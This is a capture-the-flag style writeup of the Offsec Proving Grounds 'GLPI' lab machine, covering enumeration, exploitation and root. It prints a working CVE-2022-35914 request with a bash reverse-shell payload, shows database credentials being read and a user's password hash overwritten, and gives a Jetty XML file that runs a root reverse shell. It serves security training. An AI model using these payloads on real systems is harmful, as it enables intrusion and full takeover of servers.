---
title: "Proving grounds Play: GLPI"
layout: post
date: 2023-10-15 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- GLPI
- Jetty
- CVE-2022-35914
- RCE
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 984e5de1e697296fd9e0d482a8f64f3f (RSA)
|   256 5723571ffd7706be256661146dae5e98 (ECDSA)
|_  256 c79baad5a6333591341eefcf61a8301c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Authentication - GLPI
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: C01D32D71C01C8426D635C68C4648B09
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp open  http - Apache httpd 2.4.41 ((Ubuntu))

http://192.168.169.242/

![img](/assets/images/CTF/Proving_Grounds/GLPI/web.png)

## Directory and File Fuzzing

```text
[21:47:25] 301 -  317B  - /ajax  ->  http://192.168.169.242/ajax/
[21:47:28] 301 -  316B  - /bin  ->  http://192.168.169.242/bin/
[21:47:32] 301 -  319B  - /config  ->  http://192.168.169.242/config/
[21:47:33] 301 -  316B  - /css  ->  http://192.168.169.242/css/
[21:47:37] 301 -  318B  - /files  ->  http://192.168.169.242/files/
[21:47:38] 301 -  318B  - /front  ->  http://192.168.169.242/front/
[21:47:41] 301 -  316B  - /inc  ->  http://192.168.169.242/inc/
[21:47:41] 200 -    9KB - /index.php
[21:47:41] 301 -  320B  - /install  ->  http://192.168.169.242/install/
[21:47:42] 301 -  315B  - /js  ->  http://192.168.169.242/js/
[21:47:43] 301 -  316B  - /lib  ->  http://192.168.169.242/lib/
[21:47:44] 200 -   34KB - /LICENSE
[21:47:45] 301 -  324B  - /marketplace  ->  http://192.168.169.242/marketplace/
[21:47:50] 301 -  317B  - /pics  ->  http://192.168.169.242/pics/
[21:47:51] 301 -  320B  - /plugins  ->  http://192.168.169.242/plugins/
[21:47:54] 301 -  319B  - /public  ->  http://192.168.169.242/public/
[21:47:56] 200 -   79KB - /phpinfo.php
[21:47:59] 403 -  280B  - /server-status
[21:48:02] 301 -  318B  - /sound  ->  http://192.168.169.242/sound/
[21:48:02] 301 -  316B  - /src  ->  http://192.168.169.242/src/
[21:48:05] 301 -  322B  - /templates  ->  http://192.168.169.242/templates/
[21:48:08] 301 -  319B  - /vendor  ->  http://192.168.169.242/vendor/
```

Tthe changelog file disclosed the exact version of the GLPI which is 10.0.2. The sql error log file disclosed the username in the machine.

http://192.168.169.242/files/_log/

![img](/assets/images/CTF/Proving_Grounds/GLPI/log.png)

## Users

- betty

## CVE-2022-35914

The GLPI v10.0.2 is vulnerable to [GLPI htmlawed (CVE-2022-35914)](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) exploit.

Direct to the URL `/vendor/htmlawed/htmlawed/htmLawedTest.php`.

http://192.168.169.242/vendor/htmlawed/htmlawed/htmLawedTest.php

![img](/assets/images/CTF/Proving_Grounds/GLPI/exp.png)

As mentioned in the exploit blog the exploitation is easy if the `exec` function is enabled in the settings and in our case the function has been disabled. So in order to achieve the remote code execution we have to use the callback functions like array_map,call_user_func,…

```http
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 192.168.169.242
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Connection: close
Cookie: sid=bs


text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.194/80+0>%261'
```

```sh
listening on [any] 80 ...
connect to [192.168.45.194] from (UNKNOWN) [192.168.169.242] 42674
bash: cannot set terminal process group (1084): Inappropriate ioctl for device
bash: no job control in this shell
www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

Internal running process shows mysql server is running on port 3306. 

```sh
www-data@glpi:/home/betty$ netstat -antup
netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.169.242:80      192.168.45.194:39558    ESTABLISHED -                   
tcp        0    140 192.168.169.242:60292   192.168.45.194:80       ESTABLISHED 3203/bash           
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                  
```

**MySQL Credentials**

```sh
www-data@glpi:/var/www/glpi/config$ cat config_db.php
cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'glpi_db_password';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
www-data@glpi:/var/www/glpi/config$
```

Login to mysql and update password for user betty. 

Generate Bcrypt hash for the new password from [here](https://bcrypt.online/) `password:$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu`.


**Update new password**

```sh
mysql> update glpi_users set password='$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu' where id=7;
update glpi_users set password='$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu' where id=7;
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Login to user betty on the GLPI web application.

There is a ticket created by betty for password reset and the ticket contains the latest password for the user betty.

![img](/assets/images/CTF/Proving_Grounds/GLPI/ticket.png)

SSH to the user betty using credentials `betty:SnowboardSkateboardRoller234`.

Download and run `pspy` on the attacking machine to monitor the running process to escalate privileges.

pspy show the jetty server is running as root user.

```sh
2023/10/17 02:30:24 CMD: UID=0     PID=1449   | /usr/libexec/fwupd/fwupd 
2023/10/17 02:30:24 CMD: UID=0     PID=1255   | /usr/bin/java -Djava.io.tmpdir=/tmp -Djetty.home=/opt/jetty -Djetty.base=/opt/jetty/jetty-base --class-path /opt/jetty/jetty-base/resources:/opt/jetty/lib/logging/slf4j-api-2.0.0.jar:/opt/jetty/lib/logging/jetty-slf4j-impl-11.0.12.jar:/opt/jetty/lib/jetty-jakarta-servlet-api-5.0.2.jar:/opt/jetty/lib/jetty-http-11.0.12.jar:/opt/jetty/lib/jetty-server-11.0.12.jar:/opt/jetty/lib/jetty-xml-11.0.12.jar:/opt/jetty/lib/jetty-util-11.0.12.jar:/opt/jetty/lib/jetty-io-11.0.12.jar:/opt/jetty/lib/jetty-security-11.0.12.jar:/opt/jetty/lib/jetty-servlet-11.0.12.jar:/opt/jetty/lib/jetty-webapp-11.0.12.jar:/opt/jetty/lib/jetty-deploy-11.0.12.jar org.eclipse.jetty.xml.XmlConfiguration java.version=11.0.17 java.version.major=11 java.version.micro=17 java.version.minor=0 java.version.platform=11 jetty.base=/opt/jetty/jetty-base jetty.base.uri=file:///opt/jetty/jetty-base jetty.home=/opt/jetty jetty.home.uri=file:///opt/jetty jetty.state=/opt/jetty/jetty-base/jetty.state jetty.webapp.addServerClasses=org.eclipse.jetty.logging.,${jetty.home.uri}/lib/logging/,org.slf4j. runtime.feature.alpn=true slf4j.version=2.0.0 /opt/jetty/etc/jetty-bytebufferpool.xml /opt/jetty/etc/jetty-threadpool.xml /opt/jetty/etc/jetty.xml /opt/jetty/etc/jetty-webapp.xml /opt/jetty/etc/jetty-deploy.xml /opt/jetty/etc/jetty-http.xml /opt/jetty/etc/jetty-started.xml start-log-file=/var/run/jetty/jetty-start.log 
```

The jetty server is vulnerable to remote code execution vulnerability.

![img](/assets/images/CTF/Proving_Grounds/GLPI/jetty.jpg)

[More](https://twitter.com/ptswarm/status/1555184661751648256)

## Exploitation

- Direct to `/opt/jetty/jetty-base/` and check for any web apps folder.

```sh

l 24
drwxr-xr-x 5 root  root  4096 Mar 21  2023 .
drwxr-xr-x 7 root  root  4096 Jan 25  2023 ..
-rw-r--r-- 1 root  root   104 Mar 21  2023 jetty.state
drwxr-xr-x 2 root  root  4096 Jan 25  2023 resources
drwxr-xr-x 2 root  root  4096 Jan 25  2023 start.d
drwxr-xr-x 2 betty betty 4096 Jan 25  2023 webapps      #webapp
betty@glpi:/opt/jetty/jetty-base$ 
```
- Create a xml file as below.

```xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/tmp/run.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
```

The file will run the `/tmp/run.sh` file as root which will give us the root shell.

- Create reverse shell in `/tmp/run.sh` file.

> Note: In order to trigger the jetty server, the run.xml file has to be updated or renamed or anything. The modification of xml file inside the webapps folder will immediately trigger the server.
>
> So it will be great if the /tmp/run.sh file is created before run.xml file. Another important note that the out of band connections are not allowed in the machine, so for root shell reverse connection the netcat should be running internally.

## /tmp/run.sh

```sh
echo "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" > /tmp/run.sh
```

- Running netcat listener locally.

```sh
ty@glpi:~$ which nc
/usr/bin/nc
betty@glpi:~$ /usr//bin/nc -lvnp 4444
Listening on 0.0.0.0 4444
```

- Add xml exploit to the run.xml file.

```sh
betty@glpi:/opt/jetty/jetty-base/webapps$ nano run.xml
betty@glpi:/opt/jetty/jetty-base/webapps$ ls
run.xml
betty@glpi:/opt/jetty/jetty-base/webapps$ 
```

- Wait for reverse connection.

```sh
betty@glpi:~$ /usr//bin/nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 34940
bash: cannot set terminal process group (1254): Inappropriate ioctl for device
bash: no job control in this shell
root@glpi:/opt/jetty/jetty-base# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).